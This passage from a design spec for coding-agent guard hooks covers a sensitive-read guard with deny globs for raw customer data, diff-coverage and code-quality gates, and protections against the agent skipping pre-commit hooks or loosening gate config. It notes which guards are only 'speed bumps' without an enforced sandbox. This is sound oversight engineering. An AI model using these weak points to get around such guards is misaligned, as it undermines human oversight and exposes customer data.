`overlay` · `pre_tool_use` · `Read|Grep|Glob|NotebookEdit` plus Bash readers (`cat`, `head`, `tail`, `less`, `sed`, `awk`, `cut`, `sqlite3`, `duckdb`, `python -c ... read_csv|read_parquet`) · `ask` (`deny` with `mode: enforce`) · label: **boundary** for structured reads; **speed bump** for Bash readers (the native sandbox `denyRead` is the real barrier only when the sandbox is enforced, E.4 Shared)

**Behavior.** Path-based only; it never reads CSV or parquet content. Reads of overlay-configured raw-data globs (e.g. `data/raw/**`, `exports/**`, `*.parquet`, `*.sqlite`, `*.db`, `*.xlsx`, `*.csv` above `config.csv_max_sample_bytes`) → `ask`, unless under `config.allow_globs` (`data/fixtures/**`, `data/synthetic/**`, `tests/**`). Notebooks: `stat()` first; over `gc:shared.notebook_max_bytes` → `ask` without parsing; otherwise, if any cell has outputs → `ask` ("outputs may embed customer rows; read with outputs stripped"). The catalog's `applies_if: has_notebooks OR an ML stack` is not expressible: `evaluate_predicate` ANDs its keys (detector.py:386-449), so the hook ships without `applies_if`, and its globs make it inert in repos without data directories. Overlay config:

```yaml
config:
  mode: ask            # enforce → deny
  deny_globs: ["data/raw/**", "exports/**", "*.parquet", "*.sqlite", "*.db", "*.xlsx"]
  csv_max_sample_bytes: 65536
  allow_globs: ["data/fixtures/**", "data/synthetic/**", "tests/**"]
```

**Implementation.** Handler `sensitive_read_guard` (`hook_runtime/handlers/sensitive_reads.py`, NEW) over the same `PathPolicy` as secrets-path-guard, inheriting its case-folding and hard-link fixes. When enabled, the adapter also renders `permissions.deny` `Read(<glob>)` rows for `deny_globs` (hold without a sandbox) and `sandbox.filesystem.denyRead` (binds sandboxed Bash only; a speed bump unless the sandbox is enforced, Shared, E.4).

**Budget & failure mode.** < 1 ms incremental; 5-50 ms for capped notebook parses. `on_error: ask`.

**Guards.** Allow globs; size threshold; off in the engine.

**Portability.** Claude and OpenCode pre-tool.

**Off-workstation twin.** The native `Read(...)` denies and, when enforced, the sandbox `denyRead`; data-classification controls on the storage itself.

**Tests.** With the overlay config: `Read data/raw/customers.csv` → ask; `data/fixtures/x.csv` → none; a 300 MB notebook → ask with a `json.load` spy proving no parse; `mode: enforce` → deny; engine default → not rendered.

### Open questions raised in E.3–E.5

The authoritative, deduplicated list is §K; these are its E.3–E.5 sources.

- **E-Q1 (L3 exception).** *Moved to QC-13 (§C.8)*, the single entry; §C.2.1 specifies the proposed exception.
- **E-Q2 (L4 scope).** *Resolved*: §C.2.4's generic managed-array operation covers `permissions.deny`, `permissions.allow`, `sandbox.filesystem.denyRead` and `sandbox.network.allowedDomains`, one lock entry per string (§B.6).
- **E-Q3 (Claude command frontmatter).** *Resolved*: §C.4.3 (renderer change) and P3 (`has_sentinel` accepts the first body line after frontmatter).
- **E-Q4 (prompt bodies).** `security-review.md.j2` and `find-injected-vulnerability.md.j2` do not say "do not modify the code" (the catalog assumed they did), though their eval tasks gate `file_unchanged`. Proposed: add one sentence to each body so the advisory text matches the enforced `write_scope`.
- **E-Q5 (ticket key).** The catalog places "required ticket key" in git-commit-push-policy-guard's rows. Proposed split: ticket trailer here (`required_trailers`), ticket-in-subject as a commitizen `schema_pattern` (§F.4). Where the trailer rows run at the commit-msg stage is settled: `playbook check-commit-trailers` beside `cz check`. Confirm.
- **E-Q6 (principle 4 refinement).** *Merged into QC-11 (§C.8)*, the single strict-mode entry.
- **E-Q7 (merge semantics).** *Resolved*: §A.6 adopted the additive key policies (`extend`/`strictest`/`relax`/`replace`), `mandatory`, and validate rules H14/H15.
- **E-Q8 (detector churn).** Rewiring `detector._parse_dep_name` to PEP 503 changes dependency keys in `detector_cache` (e.g. `scikit_learn` → `scikit-learn`), so consumers see a one-time `.coding-agent-playbook.toml` diff on `check --refresh`, and `applies_if` lists match more names than before. Changelog it.
- **E-Q9 (ruff probe).** The sync-time code filter relies on `ruff rule --all --output-format json` (code, preview flag). For a pinned ruff without it, the fallback is one `ruff rule <code>` per code at sync, still never at hook time.
- **E-Q10 (MultiEdit).** *Resolved*: §A.2 keeps `MultiEdit` in the `edit` class as a tolerated legacy name.

---

## §F — New tools from the user's notes: coverage, deterministic quality metrics, docstrings, commit names

The user's notes ask for four **tools**: test coverage, code quality through deterministic metrics, docstrings, and commit names. Each one is specified here at four levels:

- an engine capability, reusable without hooks: a `Metric`, or a consumer-toolchain binary the engine pins and calls;
- the hook or hooks that call it;
- a **pre-commit twin**;
- a **CI twin**.

This follows the principle that every speed bump has an off-workstation twin. Addendum D-Q1/D-Q2 (user decision) governs the design: **reuse existing tools, don't reimplement.** Three of the four tools extend the existing evaluator subsystem (SPEC §21): `Metric` + `@register_metric` (`evaluators/metric.py:104`), a per-metric `Normalizer` (`evaluators/normalizer.py:60/85/97`), `ThresholdCheck` / `NonRegressionCheck` (`evaluators/check.py:357/392`), the defaults table in `evaluators/policy.py:38` and `playbook metrics --baseline git:HEAD [--run-tests]`; their new metrics wrap ruff (a consumer-toolchain subprocess) and radon (the one optional extra). The fourth, commit names, is commitizen (`cz check`) from the consumer's toolchain, with no engine linter. The engine's optional extras stay **radon only**.

The Stop stages `coverage`, `quality-metrics` and `docstrings` are the names §E.0.4 reserves. Hook entries below use the §E.0.7 entry format.

### F.0 Shared groundwork (applies to F.1–F.4)

#### F.0.1 The four tools at a glance

Each row lists the engine capability (NEW unless marked existing), its CLI, the hook that uses it (id · event or stage · tier), the pre-commit twin, and the CI twin (a `playbook ci` step, F.5).

| Tool | Engine capability | CLI | Hook (id · event/stage · tier) | Pre-commit twin | CI twin (`playbook ci` step, F.5) |
| --- | --- | --- | --- | --- | --- |
| **Test coverage** (F.1) | `diff_coverage` execution metric (stdlib; reuses `evaluators/execution/coverage_xml.py` + `git diff -U0`), plus the existing `coverage` metric (`evaluators/execution/coverage.py:65`) | `playbook metrics --run-tests --select testing --baseline git:<ref>` | `coverage-diff-gate` · stop `coverage` (stage 12) · **opt-in + trust** | `playbook-coverage` (`stages: [manual]`) | `coverage` (included when `[metrics] run_tests = true`) |
| **Quality metrics** (F.2) | the existing static metrics, plus `ruff_violations` (family `quality`: C901, PLR0911, PLR0912, PLR0913, PLR0915) and the radon-backed `file_sloc`; per-edit feedback through the shared post-edit ruff call | `playbook metrics --baseline git:<ref> [--changed] [--extend-select ruff_violations,file_sloc]` | clean-code-metrics-nonregression (§E.2) · stop `quality-metrics` (stage 2) · default; post-edit companion opt-in | `playbook-metrics` / `coding-agent-playbook-metrics` (existing; gain `--no-run-tests`) | `metrics` |
| **Docstrings** (F.3) | `ruff_violations` family `docstrings` (D100–D107); the `python-docstrings` rule's `lint_codes` for post-edit; opt-in strict `docstring_example` (a tiny stdlib ast check) | `playbook metrics --select ruff_violations …` | `docstring-nonregression` · stop `docstrings` (stage 3) · default; post-edit (D1xx in the shared ruff call) default | the same `playbook-metrics` hook, when the consumer selects `ruff_violations` | `metrics` |
| **Commit names** (F.4) | none in the engine: commitizen `cz check` from the consumer's toolchain, pinned per worktree | `cz check` (no `playbook` wrapper) | `commit-message-convention` · `pre_tool_use` (bash branch) · default | `playbook-commit-msg` / `coding-agent-playbook-commit-msg` (`cz check --commit-msg-file`, `stages: [commit-msg]`) | `commit-convention` (cut-over-filtered `cz check`) |

*(shared names — proposed: the hook ids `coverage-diff-gate`, `docstring-nonregression`, `commit-message-convention`; the pre-commit ids `playbook-coverage`, `playbook-commit-msg`, with local-template twins `coding-agent-playbook-coverage` and `coding-agent-playbook-commit-msg`; the metrics `diff_coverage`, `ruff_violations`, `file_sloc`, `docstring_example`; the metric family names `quality`, `docstrings`, `testing`.)*

All new pre-commit ids carry the `playbook-` / `coding-agent-playbook-` prefix, so block-precommit-bypass (§E.2) protects them (including `SKIP=`) with no list change.

#### F.0.2 One policy source per tool

- **Policy lives in committed config the twins also read.** Coverage, quality and docstring policy is `[metrics]` (existing, `config.py:100`) of the committed `.coding-agent-playbook.toml`, including the new `[metrics.ruff_violations]` sub-table (F.2.1). Commit naming is commitizen's own `[tool.commitizen]` in the consumer's `pyproject.toml`, plus `[hooks.commit_convention] cutover_date` (§B.1). The CLI, the pre-commit twin, the CI twin and the hook read the same tables, so a hook is never stricter or looser than its twin.
- **The hooks read these tables live.** The `quality-metrics`, `docstrings` and `coverage` stages read `[metrics]` live, extending §E.0.2's documented exception for the same parity reason; `cz` reads `[tool.commitizen]` itself. The post-edit ruff thresholds are rendered at sync from the same `[metrics.ruff_violations] config` (one source for post-edit and Stop).
  - **Loosening is watched.** control-plane-guard (§E.1) treats `[metrics] ignore` / `exclude` additions, `select` narrowing and `[metrics.ruff_violations]` changes as loosening (`ask`) and any `[hooks.commit_convention]` change as a `[hooks.*]` change (`deny`); gate-weakening-guard (§E.2) reports `[tool.commitizen]` loosening at Stop.
- **Executable paths are never read live and never committed.** The project interpreter, ruff and cz are pinned per worktree in `machine.json` (§D.8.3) at every write-mode sync; `guard_config.json` holds only the machine-independent stage record (`stop_gate.stages[coverage]`: logical tool + args). The coverage stage therefore never executes `[metrics] test_cmd` at run time, because that is an agent-editable command.
- **`.local.toml` does not apply to tool tables.** `[metrics]` and `[hooks.commit_convention]` are team policy, so a per-engineer `.local.toml` override is ignored for them, and `playbook validate` warns. This matches today's `[metrics]` read (`commands/metrics.py:421-435` reads the primary TOML only) and keeps CI, pre-commit and hooks on one policy.
- **Prerequisite (P6).** `Config.from_dict` / `to_dict` (`config.py:43-94`) drop unknown tables, so `playbook init` re-runs and `check --refresh` silently delete `[metrics]` today. P6 preserves every unknown top-level table (including `[metrics]` with its floats, via P6's `_toml.format_scalar` float branch) and adds the regression tests in `tests/cli/test_init.py` and `tests/cli/test_check.py`.

#### F.0.3 `playbook metrics` groundwork, shared by F.1–F.3

1. **Extract a behavior-preserving entry point.** This is the one §E.2 relies on.
   - **Files.** The new `src/coding_agent_playbook/evaluators/metrics_gate.py` holds discovery, baseline resolution, measurement and grading. It defines `MetricsGateRequest` (frozen), `MetricsGateResult`, `MetricsGateUsageError` and `run_metrics_gate(request) -> MetricsGateResult`.
   - **What it never does.** It never prints or parses argv, and it never imports `cli.py` or jinja2.
   - **What moves into it.** `_discover_targets` (`:119`), `_measure_source` (`:184`), `_git_show` (`:204`), `_validate_git_ref` (`:228`), `_baseline_measurements` (`:240`), `_safe_measure` (`:281`), the execution helpers (`:297-388`), `_build_rubric` (`:396`), `_merge_flags` (`:442`) and `_grading_ctx` (`:669`) move out of `commands/metrics.py`.
   - **What stays.** argparse → request, text/JSON rendering and exit codes.
   - **`run_tests` is an explicit request field**, defaulting to `False`. The `quality-metrics` and `docstrings` stages pass `False`, which closes §E.2's "`[metrics] run_tests = true` runs the suite from the hook" hole.
   - **Size.** `commands/metrics.py` is 711 lines, over the user's 500-line budget. The split brings both halves under 400.
   - **Tool paths.** `MetricsGateRequest.tool_paths: Mapping[str, str]` fills the NEW `EvalContext.tool_paths` field (default `{}`): the per-worktree `machine.json` pins inside hooks, `shutil.which` for the CLI, pre-commit and CI. `ruff_violations` (F.2) reads `tool_paths["ruff"]`.
   - **Output is byte-identical**, enforced by a golden test over the existing `tests/cli/test_metrics.py` fixtures.
2. **Metric selection** (NEW).
   - **Keys and flags.** `[metrics] select` / `extend_select` / `ignore` (lists of metric or family names) and the CLI flags `--select` / `--extend-select` / `--ignore` (comma-separated; CLI overrides config). They are ruff-shaped on purpose.
   - **Where it lives.** Resolution is `evaluators/policy.py::resolve_metric_selection(available, *, select, extend_select, ignore, run_tests) -> list[Metric]` *(NEW)*, using `policy.METRIC_FAMILIES` and `policy.OPT_IN_METRICS` *(NEW)*. Selection is policy, so it lives beside `METRIC_DEFAULTS` and not on the `Metric`, keeping R6's split where a Metric carries only measurement descriptors.
   - **Resolution rules:**
     - The default selection is `static_metrics()` minus `OPT_IN_METRICS`, plus `execution_metrics()` under `--run-tests` (today's behavior, plus the new non-opt-in metrics).
     - A family expands to its non-opt-in members. An opt-in metric is enabled only **by name**.
     - Unknown names are a usage error (exit 2).
     - Naming an execution metric without `--run-tests` is a usage error (exit 2), because running tests is never implied.
     - Family names never collide with metric names; a unit test enforces this.
   - **Families:** `quality` = {cyclomatic_complexity, wmc, lcom4, dit, cbo, maintainability_index, file_sloc, ruff_violations}; `docstrings` = {ruff_violations, docstring_example}; `testing` = {test_pass_rate, coverage, diff_coverage}. `ruff_violations` appears in two families because its measurements are per ruff code family (F.2.1); a stage keeps only its own family's scope keys.
   - `OPT_IN_METRICS = {ruff_violations, file_sloc, docstring_example}` (F.2.1 explains why the new metrics are not default-selected).
3. **`--changed`** (NEW). It restricts targets to the `*.py` files changed against the `git:` baseline: `git diff --name-only --diff-filter=AMR <ref>` plus `git ls-files --others --exclude-standard`. It requires a `git:` baseline (otherwise exit 2). The Stop stages and the CI `metrics` step use it, so the hook and CI agree on "touched". (The pre-commit hook already receives staged filenames.)
4. **Measurement snapshots** (NEW). `--emit-measurements PATH` writes the raw candidate measurements as `{"schema": 1, "tree": "<git tree id or null>", "measurements": [{"evaluator", "scope_key", "value"}]}`. The key name `evaluator` matches `Measurement` (`evaluators/types.py:50`) and the existing JSON contract. `--baseline json:PATH` consumes such a file as the baseline. This lets total-coverage non-regression compare against a cached run instead of re-running the suite on a baseline worktree (F.1.2, and the optional CI cache in F.5). A schema mismatch or an unreadable file is exit 2.
5. **`[metrics] exclude`** (NEW, list of globs). It defaults to the engine constant behind `guard_config.json` `eval.fixture_globs` (§E.0.5: `**/eval_tasks/*/setup/**`), named `evaluators/paths.py::EVAL_FIXTURE_GLOBS` *(shared name — proposed)*. It applies to default discovery, `--changed` and the Stop stages, so intentionally bad eval needle code never gates a commit or a Stop.
6. **`--run-tests / --no-run-tests`** (`argparse.BooleanOptionalAction`). `--no-run-tests` overrides `[metrics] run_tests`. Both pre-commit `playbook-metrics` entries gain `--no-run-tests`, so SPEC §21.5's "static only" promise holds even when the config sets `run_tests = true`. This resolves §E open question 5.
7. **Robustness**, applied to the CLI and hooks alike:
   - **Timeouts everywhere.** Every git subprocess gets a timeout: `[metrics] git_timeout_s`, default 10. That covers `_git_show :204`, `_validate_git_ref :228` and the worktree add/remove `:372/:383`, none of which has one today. `ProjectHandle` gains `timeout_s` (F.1.1).
   - **One batched read.** Baseline sources are read with one `git cat-file --batch` over `<ref>:<path>` lines instead of one `git show` per file. Missing objects still mean "all-new".
   - **Bad input is skipped with a note, never a traceback.** Candidate parsing catches `SyntaxError`, `RecursionError` and `ValueError`, and files over `max_file_bytes` (default 1 000 000) are not parsed. Today `:617` catches only `SyntaxError`.
   - **Measured cost.** On this worktree, importing `commands.metrics` plus the builtins takes 0.09s, measuring all six static metrics over the 711-line `commands/metrics.py` takes 0.013s, and one `git show` takes 0.045s. Stop cost is therefore dominated by process import (plus one ruff subprocess per side for `ruff_violations`, 0.03–0.04s each), not by the catalog's estimate of 2.4s per file.
8. **Exit codes are unchanged:** `0` pass, `1` breach with `fail_on_breach`, `2` usage. The new usage errors are: an unknown selection name, an execution metric selected without `--run-tests`, `--changed` without a `git:` baseline, and a bad `json:` baseline.

### F.1 Test coverage

#### F.1.1 Tool

**Prerequisite bug fix (found while designing).** `evaluators/checks/execution.py:47` defaults `CoverageCheck(warn=80.0)` in raw units. The v0.13 thresholds are 0–1 on the normalized score, and `PercentNormalizer` never exceeds 1.0, so every `{check="coverage"}` handle warns even at 100%. This was verified: 100.0 → score 1.0 → level `warn`, bound 80.0. No test covers it. The fix is `warn=0.8`, plus a regression test.

**`diff_coverage`, a new execution metric** in `src/coding_agent_playbook/evaluators/execution/diff_coverage.py`. It is the percentage of the **changed executable lines** that the suite executed. It is the attribution-correct coverage signal: it scores exactly the code this change added, needs **one** suite run (no baseline run), and is the per-change complement to the aggregate `--cov-fail-under` (which `tests-with-source-nudge`, §E.2, also cannot see).

| `name` | scope | `normalizer` | default warn/fail (0–1) | default `max_worsening` | needs |
| --- | --- | --- | --- | --- | --- |
| `diff_coverage` | MODULE (one measurement, key `ctx.label`) | `PercentNormalizer()` | `fail=0.8` | `0` (moot: absolute by construction) | `ctx.project` with `diff_base` set |

The algorithm is pure stdlib:

1. **Changed lines.** `git diff --no-color --no-ext-diff -M --unified=0 <diff_base> -- '*.py'` runs in `project.root` with a timeout.
   - Each `+++ b/<path>` plus `@@ -a[,b] +c[,d] @@` hunk adds lines `c … c+d-1`. `d` defaults to 1, and `d=0` (a pure deletion) adds nothing.
   - `-M` keeps a moved file from counting as all-new.
   - Untracked `*.py` files (`git ls-files --others --exclude-standard -z`) count all of their lines.
   - The parser is `evaluators/execution/git_diff.py::changed_lines(root, base, *, timeout_s) -> dict[str, frozenset[int]]` *(NEW)*.
2. **Exclusions.** Paths matching `evaluators/paths.py::TEST_PATH_GLOBS` *(NEW; shared with F.3)* (`tests/**`, `test/**`, `**/test_*.py`, `**/*_test.py`, `**/conftest.py`) or `[metrics] exclude` are dropped. Test code is itself executed, so counting it would inflate the score whenever the agent adds tests.
3. **Executable lines.** These come from coverage.py's Cobertura `<line number hits>` rows. `evaluators/execution/coverage_xml.py` gains `CoverageReport.lines: dict[str, dict[int, int]]` and `CoverageReport.sources: tuple[str, ...]`, filled in the same single pass as `per_file`. A helper `repo_relative(filename, sources, root)` resolves each `<class filename>` against the `<sources><source>` roots. The existing `per_file` keys are untouched, so `coverage` scope keys stay stable.
4. **Score.** `exec = changed ∩ lines[file].keys()`, `covered = {l ∈ exec : hits > 0}`, and the value is `100 · Σcovered / Σexec`.
   - When there are no changed executable lines, the metric returns `[]`, so the check passes vacuously, never with a fake 100%.
   - Changed files missing from the report count as **unmeasured**: they are listed in the detail and not scored.
   - The public pure function `changed_line_coverage(changed, report) -> DiffCoverage` (per-file percentage, uncovered line **ranges**, total, unmeasured files) is shared by the metric, the CLI text renderer and the hook message.
5. **Never-imported modules are not an escape hatch.** When `diff_coverage` is selected, the default command passes `--cov=<root>` for each detected import root (src layout: each `src/<pkg>`; flat layout: each top-level package directory). That puts coverage.py in `source` mode, which reports never-imported files at 0%, so a brand-new untested module scores 0 instead of "unmeasured".

`diff_coverage` declares the new measurement descriptor `diff_based = True` (`Metric` class attribute, default `False`). It means the metric measures the candidate relative to a diff base, so a baseline run is meaningless. `run_metrics_gate` skips the baseline-worktree suite run when every selected execution metric is `diff_based`, so `--select diff_coverage` costs one suite run, not two. The baseline handle gets `diff_base=None`, so the metric yields `[]` there and candidate scopes grade as `kind="new"` (absolute). No special case is needed in `_decide` (`evaluators/check.py:176`).

**`ProjectHandle` / `default_test_cmd` extensions** (`evaluators/execution/project.py`). All are keyword-only with today's defaults, so existing callers are byte-identical.

| Change | Why |
| --- | --- |
| `ProjectHandle.diff_base: str \| None = None` | the ref `diff_coverage` diffs against; `run_metrics_gate` sets it from a `git:` baseline |
| `ProjectHandle.timeout_s: float \| None = None` passed to `subprocess.run(timeout=…)` at `:160`; `TimeoutExpired` → `RuntimeError("test command timed out after …s")` | `:160` has no timeout today; a hook-driven suite must be bounded (global CLAUDE.md rule) |
| `ProjectHandle.env_overrides: dict[str, str]`, defaulting to `{}` | the hook sets `COVERAGE_FILE=<report_dir>/.coverage` and `PYTHONDONTWRITEBYTECODE=1`, so the run leaves no new non-ignored file in the worktree; one would change the Stop fingerprint and loop the gate |
| `default_test_cmd(report_dir, *, python=sys.executable, cov_sources=())` | `sys.executable` inside the hook is the **engine** interpreter (pipx/uv-tool), which usually lacks the project's deps and pytest-cov; the hook passes the sync-pinned **project** interpreter |

Air-gapped behavior is unchanged: the target's own `pytest-cov` is used and never installed. When it is absent, pytest exits 4 on `--cov` with no junit, and `ProjectHandle._run_once` (`:179-184`) already raises. Callers turn that into a one-line toolchain hint.

#### F.1.2 Hook: `coverage-diff-gate` (stage `coverage`)

`opt-in` (+ user-local trust) · `stop`, stage 12 (execution) · runs when the deterministic stages are green, the repo is trusted, `.py` files under the import roots changed against the diff base, and completion is claimed · `deny` (configurable to `context`)

- **Behavior.**
  - **Preconditions.** All must hold; otherwise the stage is silently skipped:
    - the hook is enabled in `[hooks]`;
    - a user-local trust entry exists;
    - every deterministic stage is green (§E.0.4 rule);
    - `changed_lines(...)` is non-empty after exclusions;
    - `last_assistant_message` matches `stop_gate.claim_patterns` (the same predicate as the `tests` stage);
    - the fingerprint has not already been verified for this stage.
  - **One shared suite run** *(shared name — proposed: `SuiteRun`, cached per fingerprint under `<git-path playbook-hooks>/suite/<tree>/`)*. When `coverage` is enabled, stop-ci-parity-gate's `tests` stage reads the same run: a `ProjectHandle` full-suite run that writes junit **and** coverage XML. `tests_scope` is forced to `"all"`, because a targeted `--no-cov` run cannot measure diff coverage. With `tests` disabled, this stage runs the handle itself. Either way the suite runs once per fingerprint (§E.2 already assumes this).
  - **Grading.** One `Rubric` grades the result:
    - `metric_check("diff_coverage", <live [metrics]>)` (`policy.py:50`);
    - plus `metric_check("coverage", …)` in regression mode, **only if** a measurement snapshot exists for `HEAD^{tree}` at `<state>/coverage/<tree>.json` (F.0.3 item 4). Without one, total non-regression is deferred to CI, with the context line `total coverage not compared (no cached baseline for HEAD)`.
  - **Red suite.** A suite with failing tests is not graded for coverage. When `tests` is enabled, it owns the failure. Otherwise this stage adds `suite red (N failed); coverage not graded`, marked `NOT verified`.
  - **Output** (at most 4 lines inside the combined reason):

    ```
    coverage: 62.5% of 24 changed lines executed (min 80%)
      src/pkg/a.py: 12-15, 40 · src/pkg/b.py: 3 (+2 files)
      total 84.1% -> 83.7% vs HEAD (must not drop)
    Add or extend tests for these lines, then re-run.
    ```

    Paths are sanitized as data (§E.0.5).
  - **Green.** It writes `--emit-measurements`-format JSON to `<state>/coverage/<fingerprint>.json`. A later commit whose `HEAD^{tree}` equals that fingerprint then has a baseline.
- **Implementation.**
  - Builtin handler `coverage_diff_gate` in `hook_runtime/handlers/coverage_diff_gate.py` (`config.stage = "coverage"`). It calls `run_metrics_gate(MetricsGateRequest(run_tests=True, selection=testing, baseline=json:<cached>|None, changed_only=True, …))` with a pre-built `ProjectHandle`.
  - **Argv.** The handle's argv is built from the machine-independent `stop_gate.stages[coverage]` record (`tool = "project_python"`, args `[-m, pytest, --junitxml=…, --cov=<import root>…, --cov-report=xml:…, --cov-config=…, -o, addopts=, -p, no:cacheprovider, -q]`) and the per-worktree `machine.json` pin `tools.project_python` (§D.8.3). `-o addopts=` neutralizes `--cov-fail-under=80` (`pyproject.toml:175`), as `default_test_cmd` already does at `:72-73`.
  - **No `-I` for the suite.** The suite is **not** run with `-I`, because `python -m pytest` relies on cwd on `sys.path`. That is acceptable: the stage is trust-gated, and `-I` protects the dispatcher, not the trusted suite.
  - It never uses `uv run` (L8).
  - Config: `[hooks.coverage-diff-gate]` = `{timeout_s = 300, diff_base = "HEAD" | "merge-base", decision = "deny" | "context"}`.
    - `merge-base` diffs against `git merge-base HEAD <default branch>`, using the default-branch resolver shared with F.5 and E.4 (`refs/remotes/origin/HEAD`, then `main`, then `master`). That catches coverage gaps the agent already committed this session.
    - Thresholds come only from `[metrics]` (F.0.2).
  - `applies_if: {has_dev_dependency: ["pytest-cov"]}`. This is a **new predicate key** over the existing `dev_dependencies` fact (SPEC §8.2) that mirrors `has_framework`. It is added to `detector.py::evaluate_predicate` (`:386`) and SPEC §6.4.
- **Why opt-in.**
  - It executes repo-controlled code (conftest, tests) without a permission prompt, so it needs trust anyway (§E.0.5).
  - It costs a full suite run (tens of seconds to minutes).
  - CI is authoritative for it.
  - Default-on would be either inert (no trust entry) or an edit-to-exec escalation (§E.0.5 "no repo-controlled code without user-local trust").
- **Budget & failure.**
  - Cost is the suite duration plus about 50ms of XML and diff parsing. The per-stage `timeout_s` is 300; the Stop deadline and registration timeout follow the §D.4 formula (`budget_s` + the enabled execution stages' `timeout_s`, capped at 595 s; registration = deadline + 2 s).
  - A timeout, crash or missing pytest-cov fails open with `coverage stage skipped: <reason> — NOT verified` and one toolchain line for the **user** (toolchain-missing-hint style). It never reports green on an error.
- **Guards.**
  - It shares the coordinator's block budget and fingerprint rule.
  - At most 4 lines.
  - It is never graded on a red suite.
  - It reads thresholds live but never the test command.
- **Portability.** Claude: a Stop block line. OpenCode: evidence-only (`session.idle`; §E.2). Every harness gets the AGENTS.md line from the Hook body: "Before claiming done, run the suite with coverage and cover every changed line (≥80%)."
- **Off-workstation twin.** F.1.3.
- **Tests** (`tests/hooks/test_coverage_diff_gate.py`, through `playbook-hook simulate stop`). A named `FakeProjectHandle` *(NEW)* serves canned `RunArtifacts`, and the autouse `FakeProc` (§D.9) asserts no unscripted subprocess, so pytest is **never** executed:
  - untrusted repo: zero suite runs (spy);
  - trusted, 24 changed lines with 15 hit: one block line with ranges;
  - all changed lines covered: silent;
  - only test files changed: silent (TEST_PATH_GLOBS);
  - red suite with `tests` disabled: a `NOT verified` line and no coverage grade;
  - timeout: `NOT verified`;
  - a cached snapshot for `HEAD^{tree}` with a total drop: a total line;
  - the `tests` and `coverage` stages both enabled: exactly one `ProjectHandle.run`;
  - `COVERAGE_FILE` points into the state dir (env assertion).

#### F.1.3 Twins

- **Pre-commit** (`.pre-commit-hooks.yaml`, `language: python`, with the `tests/integration/test_precommit_hooks_yaml.py` id-set update; `resources/precommit/config.yaml.j2`, `repo: local`, `language: system`):

  ```yaml
  - id: playbook-coverage            # template id: coding-agent-playbook-coverage
    name: coding-agent-playbook coverage (diff + non-regression; runs your test suite)
    entry: playbook metrics --run-tests --select testing --baseline git:HEAD
    language: python                 # template: system
    pass_filenames: false
    types_or: [python]
    require_serial: true
    stages: [manual]                 # execution: never on every commit (SPEC §21.7)
  ```

  It is run with `pre-commit run playbook-coverage --hook-stage manual`. Consumers may move it to `pre-push`.
- **CI.** The `playbook ci` `coverage` step (F.5) runs `playbook metrics --run-tests --select testing --baseline git:<merge-base>`. That is two suite runs (candidate plus the baseline worktree), or one with `--select diff_coverage`. An optional cache: main's job runs `--emit-measurements cov.json`, and PR jobs use `--baseline json:cov.json`.

#### F.1.4 Tests (tool)

- `tests/evaluators/test_git_diff.py`: the hunk forms `+c`, `+c,0`, `+c,d`; multi-file; a rename under `-M`; untracked files count all lines; a timeout raises; a tmp git repo.
- `tests/evaluators/test_execution_parsers.py` (extend): `CoverageReport.lines` / `sources` and `repo_relative` against the `<sources>` roots.
- `tests/evaluators/test_diff_coverage.py`: no changed executable lines gives `[]`; test paths are excluded; unmeasured files are listed, not scored; the baseline handle yields `[]`, so the result is `kind="new"`; `diff_based` skips the baseline run (spy).
- `tests/evaluators/test_execution_project.py` (extend): `timeout_s` maps to `RuntimeError`; `env_overrides` is passed through; the `python=` / `cov_sources=` argv.
- `tests/evaluators/test_check.py` (extend): `CoverageCheck()` at 100% gives `ok` (the warn bug regression).

### F.2 Deterministic code-quality metrics

#### F.2.1 Tool: wrap ruff and radon (addendum D-Q1)

No new metric algorithms. Two NEW `Metric`s, both thin wrappers over tools the user already relies on; the previously proposed stdlib `function_length` / `nesting_depth` / `file_length` metrics are **dropped** (ruff's C901/PLR rules and radon's raw SLOC cover them).

| `name` (module) | scope | raw value | `normalizer` | default warn/fail | default `max_worsening` | availability |
| --- | --- | --- | --- | --- | --- | --- |
| `ruff_violations` (`evaluators/builtins/ruff_violations.py`) | FILE; one measurement per (file, family), scope key `parse.scope_key(label, "ruff:<family>")` (`parse.py:30`), e.g. `src/x.py::ruff:quality` | count of the family's codes ruff reports for the file | `RampNormalizer(good=0, bad=5)` (falling: 0 → 1.0, ≥ 5 → 0.0) | none | `0` | `available()` is `False` when `EvalContext.tool_paths` has no `"ruff"` |
| `file_sloc` (`evaluators/builtins/file_sloc.py`) | FILE | radon `raw` SLOC (`radon.raw.analyze(source).sloc`), imported lazily inside `measure` | `RampNormalizer(good=300, bad=800)` | none | `1.0` (regression-exempt) | `requires = "radon"`; `available()` is `False` without radon — the `maintainability_index` pattern (`builtins/maintainability.py:35-88`) |

**`ruff_violations` algorithm.**
- One subprocess per side per file: `<ruff> check --no-fix --exit-zero --force-exclude --output-format json --stdin-filename <label> --select <union of the configured families' codes> [--config <key>=<value> …] -`, with `ctx.source` on stdin and `timeout=[metrics] git_timeout_s`. Candidate and baseline both go through stdin — the baseline text is the `git cat-file --batch` blob that `run_metrics_gate` already reads (F.0.3 item 7) — so the metric needs no worktree and is identical on both sides. `--force-exclude` keeps project excludes (and P9's eval-fixture exclusion) effective with `--stdin-filename`. `--select` (not `--extend-select`) is deliberate here: the metric counts exactly the configured codes, while the project's `per-file-ignores` and `# noqa` still apply.
- JSON entries are grouped by code into families; a code outside every configured family is ignored. A syntax error (`code: null`) makes the file's measurement unavailable (no value, never 0), and the CLI notes it.
- `[metrics.ruff_violations]` (NEW sub-table; `MetricConfig` gains `ruff_families`, `ruff_config`, `ruff_preview`): `families` (default `{quality = ["C901", "PLR0911", "PLR0912", "PLR0913", "PLR0915"], docstrings = ["D100", "D101", "D102", "D103", "D104", "D105", "D106", "D107"]}`), `config` (default `{}`; per-invocation `--config` overrides such as `"lint.mccabe.max-complexity" = 10`, `"lint.pylint.max-args" = 5`, `"lint.pylint.max-statements" = 20` — the user's Clean Code budgets go here, and non-regression keeps legacy code silent), and `preview` (default `false`). PLR1702 (nesting) and the DOC* pydoclint port are preview-only in ruff 0.15.10: adding them to a family requires `preview = true`, which passes `--preview` on this per-invocation call only — never by editing the consumer's ruff config. All verified stable codes above were checked against ruff 0.15.10 locally (addendum D-Q1).
- ruff is a consumer-toolchain binary (it is in this repo's `.[dev]`), never an engine import; the path comes from `EvalContext.tool_paths` (F.0.3 item 1).

**Selection and upgrade impact.**
